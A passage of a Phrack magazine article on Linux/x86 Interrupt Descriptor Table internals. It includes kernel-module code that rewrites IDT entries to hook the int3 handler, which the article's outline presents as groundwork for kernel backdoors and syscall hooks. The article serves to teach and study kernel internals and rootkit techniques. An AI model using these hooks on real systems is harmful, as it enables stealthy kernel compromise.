@@ -1,0 +1,2665 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: Handling the Interrupt Descriptor Table ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a class="current" href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack59.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack59.tar.gz" title="Get current issue tar.gz">59</a> | <strong>Release date</strong> : <b>2002-07-28</b> | <strong>Editor</strong> : <b>Phrack Staff</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/59/1.html#article">Introduction</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/59/2.html#article">Loopback</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/59/3.html#article">Linenoise</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/59/4.html#article">Handling the Interrupt Descriptor Table</a></td><td align="right">kad</td></tr>
+<tr><td align="left"><a href="../../issues/59/5.html#article">Advances in kernel hacking II</a></td><td align="right">palmers</td></tr>
+<tr><td align="left"><a href="../../issues/59/6.html#article">Defeating Forensic Analysis on Unix</a></td><td align="right">the grugq</td></tr>
+<tr><td align="left"><a href="../../issues/59/7.html#article">Advances in format string exploitation</a></td><td align="right">riq &amp; gera</td></tr>
+<tr><td align="left"><a href="../../issues/59/8.html#article">Runtime process infection</a></td><td align="right">anonymous author</td></tr>
+<tr><td align="left"><a href="../../issues/59/9.html#article">Bypassing PaX ASLR protection</a></td><td align="right">Tyler Durden</td></tr>
+<tr><td align="left"><a href="../../issues/59/10.html#article">Execution path analysis: finding kernel based rootkits</a></td><td align="right">Jan K. Rutkowski</td></tr>
+<tr><td align="left"><a href="../../issues/59/11.html#article">Cuts like a knife, SSHarp</a></td><td align="right">stealth</td></tr>
+<tr><td align="left"><a href="../../issues/59/12.html#article">Building ptrace injecting shellcodes</a></td><td align="right">anonymous author</td></tr>
+<tr><td align="left"><a href="../../issues/59/13.html#article">Linux/390 shellcode development</a></td><td align="right">johnny cyberpunk</td></tr>
+<tr><td align="left"><a href="../../issues/59/14.html#article">Writing Linux Kernel Keylogger</a></td><td align="right">rd</td></tr>
+<tr><td align="left"><a href="../../issues/59/15.html#article">CRYPTOGRAPHIC RANDOM NUMBER GENERATORS</a></td><td align="right">DrMungkee</td></tr>
+<tr><td align="left"><a href="../../issues/59/16.html#article">Playing with Windows /dev/(k)mem</a></td><td align="right">crazylord</td></tr>
+<tr><td align="left"><a href="../../issues/59/17.html#article">Phrack World News</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/59/18.html#article">Phrack magazine extraction utility</a></td><td align="right">Phrack Staff</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : Handling the Interrupt Descriptor Table</div>
+<div class="opt-bottom"> <strong>Author</strong> : kad</div>
+<pre>                          ==Phrack Inc.==
+
+               Volume 0x0b, Issue 0x3b, Phile #0x04 of 0x12
+
+|=-----=[ Handling Interrupt Descriptor Table for fun and profit ]=------=|    
+|=-----------------------------------------------------------------------=|
+|=----------------=[ kad, &lt;kadamyse@altern.org&gt; ]=-----------------------=|
+
+
+--[ Contents
+
+  1 - Introduction
+
+  2 - Presentation 
+    2.1 - What is an interrupt?
+    2.2 - Interrupts and exceptions
+    2.3 - Interrupt vector
+    2.4 - What is IDT?
+
+  3 - Exceptions 
+    3.1 - List of exceptions
+    3.2 - Whats happening when an exception appears ? 
+    3.3 - Hooking by mammon
+    3.4 - Generic interrupt hooking
+    3.5 - Hooking for profit : our first backdoor
+    3.6 - Hooking for fun
+
+  4 - The hardware interrupt
+    4.1 - How does It work ?
+    4.2 - Initialization and activation of a bottom half
+    4.3 - Hooking of the keyboard interrupt
+
+  5 - Exception programmed for the system call 
+    5.1 - List of syscalls
+    5.2 - How does a syscall work ?
+    5.3 - Hooking for profit
+        5.3.1 - Hooking of sys_setuid
+        5.3.2 - Hooking of sys_write
+    5.4 - Hooking for fun 
+
+  6 - CheckIDT
+
+  7 - References &amp; Greetz
+
+  8 - Appendix
+
+
+--[ 1 - Introduction
+
+    The Intel CPU can be run in two modes: real mode and protected mode.
+The first mode does not protect any kernel registers from being altered
+by userland programs. All modern Operating System make use of the
+protected mode feature to restrict access to critical registers by
+userland processes. The protected mode offers 4 different 'privilege
+levels' (ranging from 0..3, aka ring0..ring3). Userland applications
+are usually executed in ring3. The kernel on the other hand is executed 
+in the most privileged mode, ring0. This grants the kernel full access
+to all CPU registers, all parts of the hardware and the memory. With no
+question is this the mode of choice to do start some hacking.
+
+    The article will demonstrate techniques for modifying the Interrupt
+Descriptor Table (IDT) on Linux/x86. Further on will the article explain
+how the same technique can be used to redirect system calls to achieve
+similar capability as with Loadable Kernel Modules (LKM).
+
+    The presented examples in this article will only make use of LKM to
+load the executable code into kernel space for simplicity reasons. Other
+techniques which are not scope of this document can be used to either
+load the executable code into the kernel space or to hide the kernel
+module (Spacewalker's method for example).
+
+    CheckIDT which is a useful tool for examining the IDT and to avoid
+kernel panics every 5 minutes is provided at the end of that paper.
+
+
+--[ 2 - Presentation
+
+----[ 2.1 - What's an interrupt?
+
+    &quot;An interrupt is usually defined as an event that alters the
+sequence of instructions executed by a processor. Such events correspond to
+electrical signals generated by hardware circuits both inside and outside
+of the CPU chip.&quot;
+(from: &quot;Understanding the Linux kernel,&quot; O'Reilly publishing.)
+
+
+----[ 2.2 - Interrupts and exceptions
+
+    The Intel reference manual refers to &quot;synchronous interrupts&quot; (those
+which are produced by the CPU Control Unit (CU) after the execution of an
+instruction has been finished) as &quot;exceptions&quot;. Asynchronous interrupts
+(those which are generated by other hardware devices at arbitrary time) are
+referred to as just &quot;interrupts&quot;. Interrupts are issued by external I/O
+devices whereas exceptions are caused either by programming errors or by
+anomalous conditions that must be handled by the kernel. The term
+&quot;Interrupt Signals&quot; will be used during this article to refer to both,
+exceptions and interrupts.
+
+    Interrupts are split into two categories: Maskable interrupts which can
+be ignored (or 'masked') for a short time period and non-maskable
+interrupts which must be handled immediately. Unmaskable interrupts are
+generated by critical events such as hardware failures; I won't deal
+with them here. The well-known IRQs (Interrupt ReQuests) fall into the
+category of maskable interrupts.
+
+    Exceptions are split into two different categories: Processor
+generated exceptions (Faults, Traps, Aborts) and programmed exceptions
+which can be triggered by the assembler instructions int or int3. The
+latter one are often referred to as software interrupts.
+
+
+----[ 2.3 - Interrupt vector
+
+Each interrupt or exception is identified by a number between 0 and 255.
+Intel calls this number a vector. The numbers are classified like this:
+
+- From 0 to 31   : exceptions and non-maskable interrupts
+- From 32 to 47  : maskable interrupts
+- From 48 to 255 : software interrupts
+
+Linux uses only one software interrupt (0x80) which is used for the
+syscall interface to invoke kernel functions.
+
+Hardware IRQs (Interrupt ReQuest) from IRQ0..IRQ15 are assigned to
+the interrupt vectors 32..47.
+
+
+----[ 2.4 - What is IDT ? 
+
+IDT = Interrupt Descriptor Table
+
+The IDT is a linear table of 256 entries which associates an interrupt
+handler with each interrupt vector.
+Each entry of the IDT is a descriptor of 8 bytes which blows the entire
+IDT up to a size of 256 * 8 = 2048 bytes.
+The IDT can contain three different types of descriptors/entries:
+
+- Task Gate Descriptor
+        
+        Linux does not use this descriptor
+
+- Interrupt Gate Descriptor
+
+63                      48|47           40|39              32  
++------------------------------------------------------------
+|                         | |D|D| | | | | | | | |           
+| HANDLER OFFSET (16-31)  |P|P|P|0|1|1|1|0|0|0|0| RESERVED  
+|                         | |L|L| | | | | | | | |           
+=============================================================
+                          |                                 |
+  SEGMENT SELECTOR        |   HANDLER OFFSET (0-15)         |
+                          |                                 |
+------------------------------------------------------------+
+31                      16|15                               0
+
+        - bits  0 to 15 : handler offset low
+        - bits 16 to 31 : segment selector
+        - bits 32 to 37 : reserved
+        - bits 37 to 39 : 0
+        - bits 40 to 47 : flags/type 
+        - bits 48 to 63 : handler offset high
+
+- Trap Gate Descriptor
+
+        Same as the previous one, but the flag is different
+
+The flag is composed as next :
+
+        - 5 bits for the type
+                interrupt gate       : 1 1 1 1 0
+                trap  gate          : 0 1 1 1 0        
+        - 2 bits for DPL
+                DPL = descriptor privilege level
+        - 1 bit reserved
+
+    Offset low and offset high contain the address of the function handling
+the interrupt. This address is jumped at when an interrupt occurs. The goal
+of the article is to change one of these addresses and let our own 
+interrupthandler beeing executed.
+
+DPL=Descriptor Privilege Level
+
+    The DPL is equal to 0 or 3. Zero is the most privileged level (kernel
+mode).  The current execution level is saved in the CPL register (Current
+Privilege Level). The UC (Unit Of Control) compares the value of the CPL
+register against the DPL field of the interrupt in the IDT. The interrupt
+handler is executed if the DPL field is greater (less privileged) or equal
+to the value in the CPL register. Userland applications are executed in
+ring3 (CPL==3). Certain interrupt handlers can thus not be invoked by
+userland applications.
+
+    The IDT is initialized one first time by the BIOS routine but Linux
+does it one more time when it take control. The asm lidt function
+initialize the idtr registry which will contain the size and idt's address.
+Then the setup_idt function fill the 256 entry of the idt with the same
+interrupt gate, ignore_int. Then the good gate will be inserted into the
+idt by the next functions:
+
+linux/arch/i386/kernel/traps.c::set_intr_gate(n, addr)
+        insert an interrupt gate at the n place at the address
+        pointed to by the idt register. The interrupt handler's address
+        is stored in 'addr'.
+        
+linux/arch/i386/kernel/irq.c
+All maskable interrupts and software interrupts are initialized with:
+	set_intr_gate :
+        
+#define FIRST_EXTERNAL_VECTOR  0x20
+
+                for (i = 0; i &lt; NR_IRQS; i++) {
+                int vector = FIRST_EXTERNAL_VECTOR + i;
+                if (vector != SYSCALL_VECTOR) 
+                        set_intr_gate(vector, interrupt[i]);    
+
+        
+linux/arch/i386/kernel/traps.c::set_system_gate(n, addr)
+        insert a trap gate.
+	The DPL field is set to 3.
+
+These interrupts can be invoked from the userland (ring3).
+
+                set_system_gate(3,&amp;int3)
+                set_system_gate(4,&amp;overflow)
+                set_system_gate(5,&amp;bounds)
+                set_system_gate(0x80,&amp;system_call);
+        
+linux/arch/i386/kernel/traps.c::set_trap_gate(n, addr)
+        insert a trap gate with the DPL field set to 0.
+        The Others exception are initialized with set_trap_gate : 
+        
+                set_trap_gate(0,&amp;divide_error)
+                set_trap_gate(1,&amp;debug)
+                set_trap_gate(2,&amp;nmi)
+                set_trap_gate(6,&amp;invalid_op)
+                set_trap_gate(7,&amp;device_not_available)
+                set_trap_gate(8,&amp;double_fault)
+                set_trap_gate(9,&amp;coprocessor_segment_overrun)
+                set_trap_gate(10,&amp;invalid_TSS)
+                set_trap_gate(11,&amp;segment_not_present)
+                set_trap_gate(12,&amp;stack_segment)
+                set_trap_gate(13,&amp;general_protection)
+                set_trap_gate(14,&amp;page_fault)
+                set_trap_gate(15,&amp;spurious_interrupt_bug)
+                set_trap_gate(16,&amp;coprocessor_error)
+                set_trap_gate(17,&amp;alignement_check)
+                set_trap_gate(18,&amp;machine_check)
+        
+
+    IRQ interrupts are initialized by set_intr_gate(), Exception int3,
+overflow, bound and the system_call software interrupt by set_system_gate().
+All others exceptions are initialized by set_trap_gate().  
+
+
+    Let's start over with some practice and examine the currently assigned
+handler addresses for each interrupt. Use the tool CheckIDT [6] attached
+to this article for this:
+
+%./checkidt -A -s
+
+Int *** Stub Address * Segment *** DPL * Type             Handler Name
+--------------------------------------------------------------------------
+0       0xc01092c8     KERNEL_CS   0     Trap gate        divide_error
+1       0xc0109358     KERNEL_CS   0     Trap gate        debug
+2       0xc0109364     KERNEL_CS   0     Trap gate        nmi
+3       0xc0109370     KERNEL_CS   3     System gate      int3
+4       0xc010937c     KERNEL_CS   3     System gate      overflow
+5       0xc0109388     KERNEL_CS   3     System gate      bounds
+6       0xc0109394     KERNEL_CS   0     Trap gate        invalid_op
+...
+18      0xc0109400     KERNEL_CS   0     Trap gate        machine_check
+19      0xc01001e4     KERNEL_CS   0     Interrupt gate   ignore_int
+20      0xc01001e4     KERNEL_CS   0     Interrupt gate   ignore_int
+...
+31      0xc01001e4     KERNEL_CS   0     Interrupt gate   ignore_int
+32      0xc010a0d8     KERNEL_CS   0     Interrupt gate   IRQ0x00_interrupt
+33      0xc010a0e0     KERNEL_CS   0     Interrupt gate   IRQ0x01_interrupt
+...
+47      0xc010a15c     KERNEL_CS   0     Interrupt gate   IRQ0x0f_interrupt
+128     0xc01091b4     KERNEL_CS   3       System gate      system_call
+
+
+The System.map contains the symbol names to the addresses shown above.
+
+% grep c0109364 /boot/System.map 
+00000000c0109364 T nmi
+nmi=not maskable interrupt -&gt;trap_gate
+
+% grep c010937c /boot/System.map 
+00000000c010937c T overflow
+overflow -&gt; system_gate
+
+% grep c01001e4 /boot/System.map
+00000000c01001e4 t ignore_int 
+
+18 to 31 are reserved by Intel for further use
+
+% grep c010a0e0 /boot/System.map
+00000000c010a0e0 t IRQ0x01_interrupt 
+device keyboard -&gt;intr_gate 
+
+% grep c01091b4 /boot/System.map 
+00000000c01091b4 T system_call 
+system call  -&gt; system_gate
+
+rem: there is a new option in checkIDT for resolving symbol
+
+
+--[ 3 - Exceptions 
+
+----[ 3.1 - List of  exceptions
+
+--------------------------------------------------------------------------+
+number  | Exception 			| Exception Handler               |
+--------------------------------------------------------------------------+
+0       | Divide Error			| divide_error()                  |
+1       | Debug				| debug()                         |
+2       | Nonmaskable Interrupt  	| nmi()                           |
+3       | Break Point			| int3()		          |
+4       | Overflow			| overflow()                      |
+5       | Boundary verification		| bounds()                        |
+6       | Invalid operation code	| invalid_op()                    |
+7       | Device not available		| device_not_available()          |
+8       | Double Fault                	| double_fault()                  |
+9       | Coprocessor segment overrun	| coprocesseur_segment_overrun()  |
+10      | TSS not valid			| invalid_tss()                   |
+11      | Segment not  present		| segment_no_present()            |
+12      | stack exception 		| stack_segment()                 |
+13      | General Protection 		| general_protection()            |
+14 	| Page Fault			| page_fault()                    |
+15      | Reserved by Intel		| none                            |
+16      | Calcul Error with float virgul| coprocessor_error()             |
+17      | Alignement check		| alignement_check()              |
+18      | Machine Check			| machine_check()                 |
+--------------------------------------------------------------------------+
+
+Exceptions are divided into two categories:
+- processor detected exceptions (DPL field set to 0)
+- software interrupts (aka programmed exceptions), (DPL field set to 3).
+
+The latter one can be invoked from userland.
+
+
+----[ 3.2 - Whats happening when an exception occurs ?
+
+    On the occurrence of an exception the corresponding handler address 
+from the current IDT is executed. This handler is not the real handler who
+deals with the exception, it's just jumps till the true/good handler.
+
+To be clearer : 
+
+exception -----&gt; intermediate Handler -----&gt; Real Handler
+
+entry.S defines all the intermediate Handler, also called Generic Handler
+or stub. The first Handler is written in asm, the real Handler written in
+C.
+
+For not being confused, lets call the first handler : asm Handler
+and the second one the C Handler.
+
+let's have a look at entry.S :
+
+entry.S :
+---------
+
+**************************************************
+ENTRY(nmi)
+        pushl $0
+        pushl $ SYMBOL_NAME(do_nmi)
+        jmp error_code
+
+ENTRY(int3)
+        pushl $0
+        pushl $ SYMBOL_NAME(do_int3)
+        jmp error_code
+
+ENTRY(overflow)
+        pushl $0
+        pushl $ SYMBOL_NAME(do_overflow)
+        jmp error_code
+
+ENTRY(divide_error)
+
+        pushl $0                # no error value/code
+        pushl $ SYMBOL_NAME(do_divide_error)
+        ALIGN
+error_code:                             
+        pushl %ds
+        pushl %eax
+        xorl %eax,%eax
+        pushl %ebp
+        pushl %edi
+        pushl %esi
+        pushl %edx
+        decl %eax                       # eax = -1
+        pushl %ecx
+        pushl %ebx
+        cld
+        movl %es,%cx
+        movl ORIG_EAX(%esp), %esi       # get the error value
+        movl ES(%esp), %edi             # get the function address
+        movl %eax, ORIG_EAX(%esp)
+        movl %ecx, ES(%esp)
+        movl %esp,%edx
+        pushl %esi                      # push the error code
+        pushl %edx                      # push the pt_regs pointer
+        movl $(__KERNEL_DS),%edx
+        movl %dx,%ds
+        movl %dx,%es
+        GET_CURRENT(%ebx)
+        call *%edi
+        addl $8,%esp
+        jmp ret_from_exception
+**********************************************
+
+Let's examine the above:
+
+    ALL handlers have the same structure (only system_call and
+device_not_available are different): 
+
+pushl $0 
+pushl $ SYMBOL_NAME(do_####name)
+jmp error_code
+
+    Pushl $0 is only used for some exceptions. The UC is supposed to smear
+the hardware error value of the exception onto the stack. Some exceptions
+to not generate an error value and $0 (zero) is pushed instead. The last
+line jumps to error_code (see linux/arch/i386/kernel/entry.S for details).
+
+error code is an asm macro used by the exceptions.
+
+so let's resume once again
+
+exception ---&gt; intermediate Handler ---&gt; error_code macro ---&gt; Real Handler
+
+The Assembly fragment error_code performs the following steps:
+
+1: Saves the registers that might be used by the high-level C function on
+   the stack.
+
+2: Set eax to -1.
+
+3: Copy the hardware error value ($esp + 36) and the handler's address
+   ($esp + 32) in esi and edi respectively.
+
+        movl ORIG_EAX(%esp), %esi     
+        movl ES(%esp), %edi             
+
+
+4: Place eax, which is equal to -1, at the error code emplacement.
+   Copy the content of es to the stack location at $esp + 32.
+ 
+5: Save the the stack's top Address into edx,then smear error_code which we
+   get back at point 3 and edx on the stack. 
+   The stack's top address must be saved for later use.
+
+6: Place the kernel data segment selector into the ds and es registry.
+
+7: Set the current process descriptor's address in ebx.
+
+8: Stores the parameters to be passed to the high-level C function on the
+   stack (e.g. the hardware exception value and the address and the stack
+   location of the saved registers from the user mode process).
+
+9: Call the exception handler (address is in edi, see 3).
+
+10: The two last instructions are for the back of the exception.
+
+error_code will jump to the suitable exception Manager. The one that's 
+gonna actually handle the exceptions (see traps.c for detailed 
+information). 
+
+So these ones are written in C.
+
+Let's take an exception handler as a concrete example. For example, the
+C handler for non maskable nmi interruption.
+
+rem: taken from traps.c
+
+**************************************************************
+asmlinkage void do_nmi(struct pt_regs * regs, long error_code)
+{
+        unsigned char reason = inb(0x61);
+        extern atomic_t nmi_counter;
+....
+**************************************************************
+
+asmlinkage is a macro used to keep params on the stack. As params are
+passed from asm code to C code through the stack, it would be bad to get
+unwanted params put on the top of the stack. Asmlinkage gonna resolve
+that point. 
+
+The function do_nmi gets a pointer of type pt_regs and error_code. 
+
+pt_regs is defined into  /usr/include/asm/ptrace.h:
+
+struct pt_regs {
+        long ebx;
+        long ecx;
+        long edx;
+        long esi;
+        long edi;
+        long ebp;
+        long eax;
+        int  xds;
+        int  xes;
+        long orig_eax;
+        long eip;
+        int  xcs;
+        long eflags;
+        long esp;
+        int  xss;
+};
+
+    A part of the registry are push on the stack by error_code, the others 
+are some registry pushed by the UC at the hardware level.
+
+This handler will handle the exception and almost all time send a signal to
+the process.
+
+
+----[ 3.3 - Hooking an interrupt (by Mammon)
+
+    Mammon wrote a txt on how to hook interrupt under linux. The technique
+I'm going to explain is similar to that of Mammon but will allow us
+to handle the interrupt in a more generic/comfortable way.
+
+Let's take int3, the breakpoint interrupt. The handler/stub is defines as
+following:
+
+ENTRY(int3)
+        pushl $0
+        pushl $ SYMBOL_NAME(do_int3)
+        jmp error_code
+
+    The C handler's address is pushed on the stack right after the dummy
+hardware error value (zero) has been saved. The assembly fragment
+error_code is executed next. Our approach is to rewrite such an asm handler
+and push our own handler's address on the stack instead of the original one
+(do_int3).
+
+Example:
+
+void stub_kad(void)
+        {
+__asm__ (
+        &quot;.globl my_stub                 \n&quot;
+        &quot;.align 4,0x90                  \n&quot;
+        &quot;my_stub:                       \n&quot;
+        &quot;pushl $0                       \n&quot;
+        &quot;pushl ptr_handler(,1)          \n&quot;
+        &quot;jmp *ptr_error_code             &quot;
+        ::
+        );
+        }
+
+    Our new handler looks similar to the original one. The surrounding
+statements are required to get it compiled with a C compiler.
+
+- We put our asm code into a function to make linking easier.
+- .globl my_stub, will allow us to reference the asm code if we declare
+  in global : extern asmlinkage void my_stub();
+- align 4,0x90, align the size of one word, on Intel processor the
+  alignement is 4 (32 bits).
+- push ptr_handler(,1) , conform to the gas syntax,we wont use it later.
+
+
+For more information about asm inline, see [1].  
+
+We push our Handler's address and we jump to error_code.
+
+ ptr_handler contain our C Handler's address :
+
+unsigned long ptr_handler=(unsigned long)&amp;my_handler;
+
+The C Handler: 
+
+asmlinkage void my_handler(struct pt_regs * regs,long err_code)
+        {
+        void (*old_int_handler)(struct pt_regs *,long) = (void *)
+old_handler;
+        printk(&quot;&lt;1&gt;Wowowo hijacking of int 3 \n&quot;);
+        (*old_int_handler)(regs,err_code);
+        return;
+        }
+
+    We get back two argument, one pointer on the registry, and err_code.
+We have seen before that error_code push this two argument. We save the
+old handler's address,the one we was supposed to push (pushl
+$SYMBOL_NAME(do_int3)). We do a little printk to show that we hooked the
+interrupt and go back to the old handler.Its the same way as hooking a
+syscall with &quot;classical method&quot;.
+
+What's old_handler ?
+
+#define do_int3    0xc010977c
+unsigned long old_handler=do_int3;
+
+do_int3 address have been catch from System.map. 
+
+rem : We can define a symbol's address on-the-fly.
+
+To be clearer  : 
+
+asm Handler
+----------------
+push 0
+push our handler
+jmp to error_code
+                
+error_code
+----------
+do some operation
+pop our handler address
+jmp to our C handler
+
+our C Handler                                                                    
+--------------------
+save the old handler's address
+print a message
+return to the real C handler
+
+Real C Handler
+-------------------
+really deal with the interrupt 
+
+
+    Now we have to change the first Handler's address in the corresponding
+descriptor in the IDT (offset_low and offset_high, see 2.4). The function
+accepts three parameters: The number of the interrupt hook, the new
+handler's address and a pointer to save the old handler's address.
+
+
+
+void hook_stub(int n,void *new_stub,unsigned long *old_stub)
+        {
+         unsigned long new_addr=(unsigned long)new_stub;
+         struct descriptor_idt *idt=(struct descriptor_idt *)ptr_idt_table;
+         //save old stub
+
+         if(old_stub)
+                *old_stub=(unsigned long)get_stub_from_idt(3);
+         //assign new stub
+         idt[n].offset_high = (unsigned short) (new_addr &gt;&gt; 16);
+         idt[n].offset_low  = (unsigned short) (new_addr &amp; 0x0000FFFF);
+         return;
+        }
+
+unsigned long get_addr_idt (void)
+        {
+         unsigned char idtr[6];
+         unsigned long idt;
+        __asm__ volatile (&quot;sidt %0&quot;: &quot;=m&quot; (idtr));
+        idt = *((unsigned long *) &amp;idtr[2]);
+        return(idt);
+        }
+
+void * get_stub_from_idt (int n)
+        {
+        struct descriptor_idt *idte = &amp;((struct descriptor_idt *)
+ptr_idt_table) [n];
+        return ((void *) ((idte-&gt;offset_high &lt;&lt; 16 ) + idte-&gt;offset_low));
+        }
+
+struct descriptor_idt:
+
+struct descriptor_idt
+        {
+        unsigned short offset_low,seg_selector;
+        unsigned char reserved,flag;
+        unsigned short offset_high;
+        };
+
+We have seen that a descriptor is 64 bits long.
+
+unsigned short : 16 bits (offset_low,seg_selector and offset_high)
+unsigned char  : 8 bits  (reserved and flag)
+
+(3 * 16 bit ) + (2 * 8 bit) = 64 bit = 8 octet 
+
+It's a descriptor for the IDT. The only interesting fields are offset_high
+and offset_low. It's the two fields we will modify.   
+
+Hook_stub performs the following steps:
+
+1: We copy our handler's address into new_addr
+
+2: We make the idt variable point on the first IDT descriptor.
+   We got the IDT's address with the function get_addr_idt().
+   This function execute the asm instruction sidt who get the idt address 
+   and his size into a variable.
+   We get the idt's address from this variable (idtr) and we send it back.
+   This have been already explained by sd and devik in Phrack 58 article 7.    
+3: We save the old handler's address with the function get_stub_from_idt.
+   This function extract the fields offset_high and offset_low from the
+   gived descriptor and send back the address.
+  
+        struct descriptor_idt *idte = &amp;((struct descriptor_idt *)
+ptr_idt_table) [n];
+        return ((void *) ((idte-&gt;offset_high &lt;&lt; 16 ) + idte-&gt;offset_low));
+
+n = the number of the interrupt to hook. idte will then contain the
+given interrupt descriptor.
+
+We send the handler's address back,for it we send a type
+(void*) (32 bits).
+
+offset_high and offset_low do both 16 bits, we slide the bit for offset 
+high to the left,and we add offset_low. The whole part give the handler's
+address. 
+
+4 : new_addr contain our handler's address,always  32 bits.
+We extract the 16 MSB and put them into offset_high and the  16
+LSB into  offset_low. 
+
+The fields offset_high and offset_low of the interrupt's descriptor to
+handle have been changed. 
+
+The whole code is available in annexe CODE 1
+
+Why is this technique not perfect?
+Its not that its bad, but it isn't appropriate for the others
+interrupt.Here we admit that all handler are like that :
+
